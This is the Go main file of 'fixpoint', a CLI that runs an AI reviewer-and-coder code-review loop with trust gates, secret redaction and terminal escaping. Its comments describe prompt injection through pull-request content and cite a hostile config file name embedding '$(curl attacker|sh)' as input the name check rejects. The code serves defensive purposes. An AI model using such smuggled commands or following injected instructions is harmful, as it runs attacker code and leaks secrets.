// fixpoint orchestrates an automated code-review cycle: reviewer agents
// report findings, a coder agent validates and fixes them, and the loop
// repeats until reviews come back clean. See fixpoint.yaml.
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/dsaiko/fixpoint/internal/agent"
	"github.com/dsaiko/fixpoint/internal/config"
	"github.com/dsaiko/fixpoint/internal/logstore"
	"github.com/dsaiko/fixpoint/internal/model"
	"github.com/dsaiko/fixpoint/internal/orchestrator"
	"github.com/dsaiko/fixpoint/internal/runlog"
)

func main() {
	os.Exit(run(os.Args[1:], os.Stdout, os.Stderr))
}

// run executes the CLI and returns the process exit status: 0 on success,
// 2 when the loop hit max_iterations without converging (and on usage
// errors, matching flag's convention), 1 for every failure or interruption.
// stdout carries requested output (--list); stderr carries the run log. Keeping
// them separate is what lets `fixpoint --list | grep` and shell completion work.
func run(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("fixpoint", flag.ContinueOnError)
	fs.SetOutput(stderr)
	fs.Usage = func() {
		fmt.Fprintf(stderr, `fixpoint - automated code-review loop

Usage:
  fixpoint <config> [flags]     run a named config from the bundle search path
  fixpoint ./some.yaml [flags]  run a config by path
  fixpoint --list               list the configs available here
  fixpoint completion <shell>   print a completion script (bash | zsh | fish)

Flags:
`)
		fs.PrintDefaults()
	}
	cfgPath := fs.String("config", "", "path to a config file (alternative to the positional name)")
	reviewOnly := fs.Bool("review-only", false, "run exactly one review round; never invoke the coder")
	maxIter := fs.Int("max-iterations", 0, "override loop.max_iterations (0 = use config)")
	baseRef := fs.String("base-ref", "", "override target.base_ref in git-diff mode; a trailing \"...\" means the merge base with HEAD (empty = use config)")
	pr := fs.Int("pr", 0, "override target.pr in pr mode; which PR to review is per-invocation, so review-pr ships without a number (0 = use config)")
	targetPath := fs.String("target", "", "point a directory-mode run at a file or a directory; a file is reviewed as a document, shown to the panel in full (empty = use config)")
	allowUntrustedFix := fs.Bool("allow-untrusted-fix", false, "permit fix rounds in pr mode; PR content is untrusted and can steer the coder via prompt injection")
	trustedTarget := fs.Bool("trusted-target", false, "assert the directory/git-diff target holds only trusted code, permitting fix rounds (fail-closed without this)")
	trustedBundle := fs.Bool("trusted-bundle", false, "assert only that the bundle files resolved from inside the target may be run; trusts no other target content and permits no fix round")
	post := fs.Bool("post", false, "publish the review on the pull request as a COMMENT: findings become visible, no verdict is acted on")
	postRunDir := fs.String("post-run", "", "publish the review a FINISHED run already produced, from its .fixpoint/<run> directory; invokes no agent")
	postVerdict := fs.Bool("post-verdict", false, "with -post, publish the verdict itself -- approving, or requesting changes on someone's PR")
	list := fs.Bool("list", false, "list the task configs on the search path with where each resolved from, and exit")
	porcelain := fs.Bool("porcelain", false, "with --list, emit a stable tab-separated form for scripts and shell completion")
	check := fs.Bool("check", false, "validate the configuration and exit without running")
	checkLive := fs.Bool("check-live", false, "validate the configuration, ping every agent, and exit without running")
	positionals, err := parseArgs(fs, args)
	if err != nil {
		// -h/-help is a request that was served, not a usage error: flag has
		// already printed the usage text, so exit successfully.
		if errors.Is(err, flag.ErrHelp) {
			return 0
		}
		return 2
	}

	runLog := newRunLogger(stderr)
	logf, logRaw := runLog.Logf(), runLog.Raw

	// Anchor the run at the project root -- the git root, or the nearest directory
	// holding a config bundle, found by walking up from the working directory. Every
	// relative path in the configuration resolves against it, so the same command
	// reviews the whole project whether it is run from the root or three
	// directories down.
	cwd, err := os.Getwd()
	if err != nil {
		logf("working directory: %v", err)
		return 1
	}
	projectRoot, err := config.ProjectRoot(cwd)
	if err != nil {
		logf("project root: %v", err)
		return 1
	}
	resolver := config.NewResolver(projectRoot)

	// Modes that print something and exit, before any config is resolved.
	if code, handled := earlyExit(resolver, projectRoot, positionals, *list, *porcelain, stdout, stderr); handled {
		return code
	}

	// Publishing a finished run needs no configuration at all: everything it acts
	// on -- the pull request, the body, the anchors -- is recorded in that run's own
	// summary. Resolving a bundle here would let a config decide something about a
	// review that was already produced under a different one.
	if *postRunDir != "" {
		// Under the interrupt handler, like every other path that talks to a forge.
		// Without it postRun ran on context.Background: agent.Supervise puts a forge CLI
		// in its own process group, so a SIGINT delivered to fixpoint's foreground group
		// -- or a plain SIGTERM -- killed the parent while gh kept going, and the review
		// it was midway through publishing landed after the operator had stopped the
		// command and been told nothing.
		ctx, stop := installSignals(logf)
		defer stop()
		return postRun(ctx, *postRunDir, *postVerdict, logf)
	}

	name, err := configName(positionals, *cfgPath)
	if err != nil {
		logf("%v", err)
		fs.Usage()
		return 2
	}

	// Compile the effective configuration in one step: the flags are folded in by
	// LoadBundle, because an override changes what a valid configuration is (e.g.
	// -review-only exempts an all-once lens list from the recurring-lens rule) and
	// validation must therefore see the post-override value.
	target, err := absTarget(*targetPath)
	if err != nil {
		logf("-target: %v", err)
		return 1
	}
	loaded, err := config.LoadBundle(resolver, name, projectRoot, config.Overrides{
		ReviewOnly:        *reviewOnly,
		MaxIterations:     *maxIter,
		BaseRef:           *baseRef,
		PR:                *pr,
		Target:            target,
		AllowUntrustedFix: *allowUntrustedFix,
		TrustedTarget:     *trustedTarget,
		TrustedBundle:     *trustedBundle,
		Post:              *post,
		PostVerdict:       *postVerdict,
	})
	if err != nil {
		logf("config: %v", err)
		return 1
	}
	cfg := loaded.Config
	logSource(logf, loaded)
	if !allowProjectSuppliedPolicy(loaded, logf) {
		return 1
	}

	if err := loaded.Validate(); err != nil {
		logf("config: %v", err)
		return 1
	}

	// Install the operator's own redaction patterns before anything that can carry
	// a secret is logged or persisted. It happens here, after validation, because
	// Validate is what proves the patterns compile -- and this is still ahead of
	// every path below, so --check and --check-live get them too. The config-loading
	// errors logged above ran under the built-in rules alone; they quote bundle
	// paths, not agent or target content.
	extraRedactions, err := cfg.Logs.RedactPatterns()
	if err != nil {
		logf("config: %v", err)
		return 1
	}
	agent.SetExtraRedactions(extraRedactions)

	o, err := orchestrator.New(loaded, logf)
	if o != nil {
		o.WithProgress(runLog)
	}
	if err != nil {
		logf("startup validation: %v", err)
		return 1
	}
	ctx, stop := installSignals(logf)
	defer stop()

	if *check {
		return checkOnly(ctx, o, cfg, logf)
	}

	if *checkLive {
		logf("static validation OK; pinging agents...")
		if err := o.Ping(ctx); err != nil {
			logf("check-live: %v", err)
			return 1
		}
		logf("check-live OK: all agents responding")
		return 0
	}

	sum, err := o.Run(ctx)
	// Tear the handler down the instant the run is over, not at return. Everything
	// below is output; there is no step left to stop and no tree left to reconcile,
	// so an interrupt arriving here is not an in-run pause -- and with the watch
	// still live, the first would announce a pause that never happens and a second
	// would force-quit a run that already succeeded. The deferred stop() above stays
	// as the backstop for the early-return paths; stop is idempotent.
	stop()

	// The scoreboard prints even when the run failed: a partial run still spent
	// tokens and may have committed rounds, and that is exactly when the operator
	// needs to see what landed. It goes through logRaw rather than logf, which
	// stamps every line with a timestamp and would shred the column alignment --
	// but still under logMu, so no concurrent log line can split the table.
	if sum != nil {
		logRaw("\n" + agent.RedactSecrets(logstore.RenderRunTable(sum)))
	}
	if err != nil {
		logf("run failed: %v", err)
		return 1
	}
	logOutcome(sum, logf)
	return model.ExitCodeFor(sum)
}

// logOutcome prints the one-line, timestamped, greppable outcome that goes
// alongside the scoreboard: the table is for a human reading the tail, this is
// what a log scraper matches.
func logOutcome(sum *model.RunSummary, logf func(string, ...any)) {
	// The closing round is counted separately -- it runs after the outcome is
	// decided, so folding it in would overstate how long convergence took.
	loopRounds, closing, commits := 0, 0, 0
	for _, r := range sum.Rounds {
		if r.Final {
			closing++
		} else {
			loopRounds++
		}
		// Counted the way the scoreboard counts (logstore/runtable.go): every commit
		// the round made, falling back to CommitSHA only when Commits is empty, so the
		// outcome line and the table above it cannot disagree about whether the run
		// committed anything.
		if n := len(r.Commits); n > 0 {
			commits += n
		} else if r.CommitSHA != "" {
			commits++
		}
	}
	done := fmt.Sprintf("done: %s after %d round(s)", sum.Termination, loopRounds)
	if closing > 0 {
		done += " + closing round"
	}
	logf("%s", done)
	if sum.Termination != model.TermAllRejected {
		return
	}
	// Exit 3, NOT 0. "The coder rejected every finding" is not "the code is clean"
	// -- it could equally mean the reviewers are miscalibrated or the coder was
	// unwilling, so automation keying on exit 0 would read a stalled run as a
	// converged one.
	//
	// It does NOT follow that nothing changed, and saying so when something did is
	// worse than saying nothing: all-rejected is a verdict on the LAST loop round
	// only, so earlier rounds may have committed fixes, and the closing round's
	// actionable lenses commit after the outcome is already decided. In either case
	// those commits are in history, and an operator told "no changes were made"
	// would not push or report them.
	if commits > 0 {
		logf("the loop rejected every finding in its last round; %d commit(s) from earlier rounds and the closing round remain", commits)
		return
	}
	logf("no changes were made: the coder rejected every finding this round")
}

// checkOnly implements --check: report how much material a run would review
// against the real target, then exit without invoking an agent.
func checkOnly(ctx context.Context, o *orchestrator.Orchestrator, cfg *config.Config, logf func(string, ...any)) int {
	// The estimate below runs git against the target, so it needs the same
	// target-integrity gates a real run applies before its first git command:
	// otherwise the command documented as invoking no agent is the one that runs a
	// repo-supplied filter.<name>.clean while git normalizes the worktree for the
	// diff, or that reports on whatever tree a core.worktree redirect points at.
	// It is the no-agent variant because this path launches no CLI inside the
	// target -- an agent's own git commands are the wider half of that exposure.
	if err := o.PreflightGuardsNoAgent(ctx); err != nil {
		logf("target: %v", err)
		return 1
	}
	// The scope line is the point of running --check against a real target: a
	// base_ref that resolves to the wrong commit is a VALID configuration, so
	// validation alone cannot catch it and the run's first round would spend real
	// money reviewing the wrong diff. A base that does not resolve at all fails
	// here rather than at round 1.
	scope, err := o.Scope(ctx)
	if err != nil {
		logf("target: %v", err)
		return 1
	}
	logf("scope: %s", scope)
	// A review-only config has no coder at all, so say that rather than printing an
	// empty name -- "coder " reads like a lookup that failed.
	who := "no coder (review only)"
	if cfg.Roles.Coder.Agent != "" {
		who = "coder " + cfg.Roles.Coder.Agent
	}
	if j := cfg.Roles.Judge.Agent; j != "" {
		who += ", judge " + j
	}
	logf("configuration OK: %d review lens(es), %s, strategy %s",
		len(cfg.Roles.Review.Prompts), who, cfg.Roles.Review.Strategy)
	// --check is static, so the fix-trust gate has not fired -- but reporting
	// "configuration OK" for a run that will refuse to start on its first step is a
	// half-truth the operator finds out about after waiting for a PR checkout.
	if !cfg.Loop.ReviewOnly {
		switch {
		case cfg.Target.Mode == config.ModePR && !cfg.Loop.AllowUntrustedFix:
			logf("NOTE: fix rounds over a pull request need -allow-untrusted-fix; this run would refuse to start without it")
		case cfg.Target.Mode != config.ModePR && !cfg.Loop.TrustedTarget && !cfg.Loop.AllowUntrustedFix:
			logf("NOTE: fix rounds need -trusted-target; this run would refuse to start without it")
		}
	}
	return 0
}

// newRunLogger is the constructor run() uses for its writers. It is a variable
// so a test can wrap them: the table's own writer is what lets a full-CLI test
// drive a concurrent log line into the window the scoreboard write holds open,
// and going through it is what pins the scoreboard to the locked path at all --
// a table written straight to stderr would never reach the wrapper.
var newRunLogger = newLogger

// newLogger builds the run's output: one runlog.Log over stderr, which renders
// the run's phase structure and holds the single mutex every writer shares.
//
// It is a function rather than a closure inside run() so a test can drive it
// against a writer of its own and pin that lock -- the interleaving it prevents
// needs a concurrent writer, which a normal run only has in a window (the
// end-of-run table racing the signal handler) that a full-CLI test cannot open on
// demand.
//
// Redaction and terminal escaping are installed as the log's transform rather than
// applied at each call site: reviewer, coder and git errors flow through here
// verbatim, and a prompt-injected agent can smuggle a credential into one (e.g.
// inside an invalid severity that validateReviewFindings echoes back). Persisted
// logs already mask these; stderr and CI console logs must too.
//
// Escaping runs after redaction, so the mask itself is never split by an escape,
// and so a name embedding ESC/CSI cannot scroll the other entries of a refusal off
// the screen and get trust asserted on a listing it drew. The log adds its own
// color AFTER this transform, which is what keeps agent text unable to forge it.
func newLogger(stderr io.Writer) *runlog.Log {
	return runlog.New(stderr).Transform(func(s string) string {
		return agent.EscapeTerminal(agent.RedactSecrets(s))
	})
}

// absTarget resolves the -target flag against the OPERATOR's working directory,
// because only this layer knows it: config anchors relative paths against the
// project root, which is not where the flag was typed when fixpoint runs from a
// subdirectory. Empty stays empty -- "use config".
func absTarget(flag string) (string, error) {
	if flag == "" {
		return "", nil
	}
	return filepath.Abs(flag)
}

// forceQuit ends the process on a second interrupt, with the interrupted run's
// exit status. It is a variable so the second-signal path can be tested at all:
// an in-process os.Exit would take the test binary with it.
var forceQuit = func() { os.Exit(1) }

// installSignals is the constructor run() uses for its interrupt handler. It is a
// variable for the same reason newRunLogger is: whether the handler is still
// installed while the end-of-run output prints is not observable from outside the
// process -- the stdlib exposes no way to ask whether a signal has a handler, and
// sending a real one to find out kills the test binary on exactly the path that
// should pass -- so a test wraps this to watch stop() land before the scoreboard.
var installSignals = notifySignals

// notifySignals returns a context canceled by the first SIGINT/SIGTERM, and
// keeps a SECOND one fatal. It replaces signal.NotifyContext, whose relay
// goroutine cancels once and then RETURNS while its signal.Notify registration
// stays installed: Go's default die-on-SIGINT behavior is disabled for the rest
// of the process, so every later Ctrl-C -- and SIGTERM, so plain `kill` too -- is
// buffered and dropped, leaving only SIGKILL.
//
// That matters precisely in the window the first signal opens. Interruption
// reconciliation deliberately runs on a FRESH context (the run's is canceled) and
// is bounded only per git operation, several operations deep; on a large
// repository, or if one of them wedges, the operator has asked to stop and must
// still be able to ask again. The returned stop func unregisters the handler and
// releases the goroutine; it is idempotent, so the caller can tear the handler
// down as soon as the run is over and still defer it as a backstop.
func notifySignals(logf func(string, ...any)) (context.Context, func()) {
	ctx, cancel := context.WithCancel(context.Background())
	// Buffered: signal delivery never blocks, and a second signal arriving while
	// the first is being handled must not be dropped.
	ch := make(chan os.Signal, 2)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	done := make(chan struct{})
	stopped := make(chan struct{})
	go func() {
		defer close(stopped)
		watchSignals(ch, done, logf, cancel)
	}()
	// once, so the caller can both tear down at the end of the run and defer the
	// same func: a second close(done) would panic.
	var once sync.Once
	return ctx, func() {
		once.Do(func() {
			// The order is the whole point: stop delivery, release the goroutine, and wait
			// for it to acknowledge before canceling. Canceling while the goroutine can
			// still run leaves it racing the caller's normal exit -- with nothing to join
			// on, a queued signal could force-quit the process out from under a run that
			// had already succeeded.
			signal.Stop(ch)
			close(done)
			<-stopped
			cancel()
		})
	}
}

// watchSignals runs the interrupt state machine until done is closed: the first
// signal announces the pause and cancels the run, a second quits outright, and a
// signal still queued when teardown starts is discarded. It is a separate
// function so a test can own both channels and pin the exact interleaving the
// tie-break below exists for -- driving it through real process signals can only
// hope to land in that window, and silently passes when it misses.
func watchSignals(ch <-chan os.Signal, done <-chan struct{}, logf func(string, ...any), cancel context.CancelFunc) {
	// Count the interrupts here rather than reading them back off ctx.Err(): the
	// stop func cancels that same context, so a canceled ctx cannot tell "the
	// operator asked twice" apart from "the run finished and tore the handler
	// down", and mistaking the latter for a second interrupt would force-quit a
	// successful run with exit 1.
	handled := 0
	for {
		select {
		case <-done:
			return
		case <-ch:
			// Teardown wins a tie. When a signal lands just as the run returns both
			// channels are ready and select picks at random; the run is already over,
			// so acting on that signal would either announce a pause that never
			// happens or quit on what is really the first interrupt.
			select {
			case <-done:
				return
			default:
			}
			handled++
			if handled == 1 {
				// Cancel BEFORE announcing, and announce through announce() rather than
				// logf: the operator's stop request must not be contingent on a writer that
				// may never drain.
				cancel()
				// Name what the pause is: the run does not stop the instant the signal
				// lands, it stops the current step and then reconciles the tree.
				announce(logf, "interrupted: stopping after the current step, then stashing any edits so the tree is left clean -- interrupt again to quit immediately")
				continue
			}
			announce(logf, "interrupted again: quitting now; the working tree may be left dirty (check `git status` and `git stash list`)")
			forceQuit()
		}
	}
}

// announceGrace bounds how long the interrupt state machine waits for one of its
// announcements to reach stderr before carrying on without it. Long enough that
// an ordinary write to a terminal, file or draining pipe always lands, short
// enough that a wedged one cannot hold the escape hatch shut.
const announceGrace = 2 * time.Second

// announce writes an interrupt announcement on its own goroutine and waits at
// most announceGrace for it, so no step of the interrupt state machine is gated
// on stderr. logf takes the log mutex and then writes: against a piped stderr
// whose consumer has stopped reading -- or with a reviewer goroutine already
// parked inside such a write while holding that lock -- the call never returns.
// Waiting on it in the watch is what would break the advertised escape, because
// the second interrupt is precisely the one an operator sends once the process
// looks wedged: the watch would stall mid-announcement, the second signal would
// sit in the buffered channel unread, forceQuit would never run, and stop()'s
// join on the watch would hang with it. The abandoned goroutine still writes if
// stderr ever drains, and dies with the process if it does not.
//
// Abandoning it while it holds the log mutex costs nothing extra, which is why
// the announcement keeps going through logf rather than around the lock. Every
// other writer -- reviewer heartbeats, the end-of-run scoreboard -- targets the
// SAME stderr, and writes to one descriptor serialize in the kernel anyway: a
// consumer that has stopped reading blocks them at the write whether or not the
// mutex is free, and one that resumes lets the parked announcement finish and
// release it. Writing announcements off-mutex would therefore not rescue a
// single line of output, and would forfeit what the one lock buys (newLogger):
// a concurrent line splitting the scoreboard's columns.
func announce(logf func(string, ...any), format string, args ...any) {
	written := make(chan struct{})
	go func() {
		defer close(written)
		logf(format, args...)
	}()
	select {
	case <-written:
	case <-time.After(announceGrace):
	}
}

// configName picks the config to run from the positional argument or -config.
// Both together is an error rather than a silent precedence rule: which one won
// decides what gets reviewed and whether fixes are permitted, so a caller must
// not have to guess.
func configName(names []string, flagPath string) (string, error) {
	switch {
	case len(names) > 1:
		return "", fmt.Errorf("expected one config name, got %d: %v", len(names), names)
	case len(names) == 1 && flagPath != "":
		return "", fmt.Errorf("both a config name (%s) and -config (%s) were given; pass one", names[0], flagPath)
	case len(names) == 1:
		return names[0], nil
	case flagPath != "":
		return flagPath, nil
	default:
		return "", errors.New("no config given; run `fixpoint --list` to see what is available")
	}
}

// logSource reports where every file the run is built from was resolved. These
// files decide what agents are told to do and which trust gates apply, so a run
// that says only "loaded fix-code" hides the thing most worth knowing: whether
// a project-local prompt shadowed the installed one.
func logSource(logf func(string, ...any), l *config.Loaded) {
	logf("project root: %s", l.ProjectRoot)
	logf("config: %s", l.Source.Config)
	if l.Source.Extends != "" {
		logf("  extends: %s", l.Source.Extends)
	}
	for _, name := range sortedKeys(l.Source.Agents) {
		logf("  agent %s: %s", name, l.Source.Agents[name])
	}
	for _, name := range sortedKeys(l.Source.Prompts) {
		logf("  prompt %s: %s", name, l.Source.Prompts[name])
	}
	// The files above no longer explain the effective run on their own: a flag can
	// enable fix rounds on a config that does not ask for them. Record the
	// assertions beside their provenance, so reading a run back answers "why was
	// this permitted?" and not just "which config was it?".
	if applied := l.Overrides.Applied(); len(applied) > 0 {
		logf("  overridden by flags: %s", strings.Join(applied, ", "))
	}
}

func sortedKeys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// listConfigs prints the runnable configs and the search path, which is both the
// discovery mechanism for a human and what shell completion consumes.
func listConfigs(r *config.Resolver, projectRoot string, stdout, stderr io.Writer) int {
	configs, err := r.ListConfigs()
	if err != nil {
		// A warning, because the error is a partial one: an unreadable bundle
		// directory on the search path must not hide the configs that did resolve. The
		// empty case below is what reports a listing that found nothing at all.
		fmt.Fprintf(stderr, "warning: listing configs: %v\n", err)
	}
	if len(configs) == 0 {
		// A failure, so it belongs on stderr: nothing is runnable here.
		fmt.Fprintf(stderr, "No configs found. Searched:\n")
		for _, b := range r.Bundles {
			fmt.Fprintf(stderr, "  %s\n", b)
		}
		fmt.Fprintf(stderr, "Install the fixpoint config bundle, or copy one into %s.\n",
			filepath.Join(projectRoot, "config"))
		return 1
	}
	for _, c := range configs {
		// Base configs are listed, not hidden: you need to know one exists to write
		// `extends: defaults`. But they are marked, because an unmarked listing reads
		// as "things you can run" and inviting someone to run a base is a wasted
		// round trip through a validation error.
		//
		// Name, description, and path all come from a bundle directory -- the first
		// one searched is <project>/config, inside the repository under review -- so
		// every one is escaped before it reaches the operator's terminal. Listing is
		// how you find out what a repository offers, and it runs before any trust
		// gate, so merely looking must not let the repository drive the terminal.
		desc := sanitizeField(c.Description)
		if !c.Runnable {
			desc = strings.TrimSpace(desc + "  (base — for `extends`, not runnable)")
		}
		fmt.Fprintf(stdout, "%-14s %s\n", escapeTerminal(c.Name), desc)
		fmt.Fprintf(stdout, "%-14s %s\n", "", escapeTerminal(c.Path))
	}
	return 0
}

// listPorcelain writes the machine-readable listing that shell completion parses:
// one config per line, tab-separated name, runnability, and description.
//
// Completion queries the binary rather than baking the config list into the
// generated script, so adding a config to a bundle takes effect immediately -- a
// script with names hardcoded at generation time would quietly go stale.
func listPorcelain(r *config.Resolver, stdout, stderr io.Writer) int {
	configs, err := r.ListConfigs()
	if err != nil {
		// Completion parses this form with stderr discarded, so an unreadable bundle
		// directory reported as fatal here would silently leave completion offering
		// nothing at all. Warn and emit what resolved; only a listing that came up
		// completely empty behind an error is a failure worth a status code.
		fmt.Fprintf(stderr, "warning: listing configs: %v\n", err)
		if len(configs) == 0 {
			return 1
		}
	}
	for _, c := range configs {
		if !bundleNameRE.MatchString(c.Name) {
			// Dropped, not mangled: a name that cannot be passed through safely is not
			// one a caller could run either. Reported on stderr (quoted, so a control
			// character cannot rewrite the operator's terminal) so a config vanishing
			// from completion is explained rather than mysterious.
			fmt.Fprintf(stderr, "skipping %q: a config name must be a bare identifier (letters, digits, dot, dash, underscore)\n", c.Path)
			continue
		}
		state := "base"
		if c.Runnable {
			state = "runnable"
		}
		// Tabs and newlines would break the format, and a description is
		// operator-authored text that could contain either.
		fmt.Fprintf(stdout, "%s\t%s\t%s\n", c.Name, state, sanitizeField(c.Description))
	}
	return 0
}

// bundleNameRE is the documented shape of a bundle name: a bare identifier.
//
// Enforced on OUTPUT because a name is a FILENAME from a bundle directory, and the
// first directory searched is <project>/config -- inside the repository under
// review. That makes every name untrusted input that reaches a shell: completion
// scripts consume this listing, and an installed script is generated once and never
// regenerated, so the binary must not hand it a name it cannot quote. A repository
// shipping config/'$(curl attacker|sh)'.yaml gets nothing past this point.
var bundleNameRE = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)

// sanitizeField flattens a value so it cannot break the tab-separated format,
// then escapes what a terminal would interpret rather than print.
func sanitizeField(s string) string {
	return escapeTerminal(strings.Join(strings.Fields(strings.ReplaceAll(s, "\t", " ")), " "))
}

// escapeTerminal renders repository-controlled text as something a terminal only
// DISPLAYS -- see agent.EscapeTerminal for what it escapes and why. A
// description is free text from a YAML file in the repository under review (the
// project bundle is searched first, so it shadows the installed one), and both
// consumers print it before any trust gate applies: `fixpoint --list` writes it
// to the operator's terminal, and the porcelain form is what zsh/fish show as the
// completion description when TAB is pressed.
func escapeTerminal(s string) string { return agent.EscapeTerminal(s) }

// allowProjectSuppliedPolicy gates bundle files that were resolved from inside the
// project under review. Those are policy, not data: an agent command (from its own
// file or inline in the task config) and a verify command are argv fixpoint runs,
// and a prompt is the instruction stream it hands an agent that can read anything
// the invoking user can. None of that needs a model's cooperation or a prompt
// injection to exploit, so it requires an explicit trust assertion.
//
// Either -trusted-bundle or -trusted-target clears it. They are separate flags
// because this gate is about files that were read BEFORE anything replaced the
// tree, while -trusted-target additionally speaks for the target's content as it
// will be when the run touches it -- which in pr mode is the PR author's. A caller
// that only needs its own bundle (`make review-pr` reviews someone else's branch
// with fixpoint's own config/ bundle) must pass the narrow flag, or it silently
// downgrades the pr-mode checkout guards as well. See config.Loop.TrustedBundle.
func allowProjectSuppliedPolicy(l *config.Loaded, logf func(string, ...any)) bool {
	supplied := l.ProjectSuppliedPolicy()
	if len(supplied) == 0 || l.Config.Loop.TrustedBundle || l.Config.Loop.TrustedTarget {
		return true
	}
	logf("refusing to run: the run is built from files inside the target, which supply the commands fixpoint executes and the instructions it sends to agents:")
	for _, s := range supplied {
		logf("  %s", s)
	}
	logf("Read those files, then pass -trusted-bundle to assert those files are trusted -- or point -config at a bundle outside the target. (-trusted-target also clears this, but it asserts more: that the target's own content is trusted, which in mode pr means the pull request's.)")
	return false
}

// parseArgs parses flags that may appear BEFORE or AFTER the positional config
// name, collecting the positionals. Go's flag package stops at the first non-flag
// argument, so `fixpoint --check fix-code --trusted-target` would otherwise
// silently drop the trailing flag -- and that flag is the gate permitting file
// edits, which makes losing it the worst possible parse failure. Looping over
// Parse consumes each positional and resumes flag parsing after it, so every
// argument order behaves the same, and a flag's own value can never be mistaken
// for the config name because Parse has already consumed it.
func parseArgs(fs *flag.FlagSet, args []string) ([]string, error) {
	var positionals []string
	for {
		if err := fs.Parse(args); err != nil {
			return nil, err
		}
		rest := fs.Args()
		if len(rest) == 0 {
			return positionals, nil
		}
		positionals = append(positionals, rest[0])
		args = rest[1:]
	}
}

// earlyExit handles the modes that print and exit without resolving a config:
// listing, its machine-readable form, and the completion subcommand. Split out of
// run so the run path itself stays a readable sequence.
//
// `completion` is intercepted here because the argument parser treats bare words
// as the config to run, so it would otherwise be looked up as a config name.
func earlyExit(r *config.Resolver, projectRoot string, positionals []string, list, porcelain bool, stdout, stderr io.Writer) (int, bool) {
	if len(positionals) > 0 && positionals[0] == "completion" {
		return writeCompletion(positionals[1:], stdout, stderr), true
	}
	if list {
		if porcelain {
			return listPorcelain(r, stdout, stderr), true
		}
		return listConfigs(r, projectRoot, stdout, stderr), true
	}
	return 0, false
}
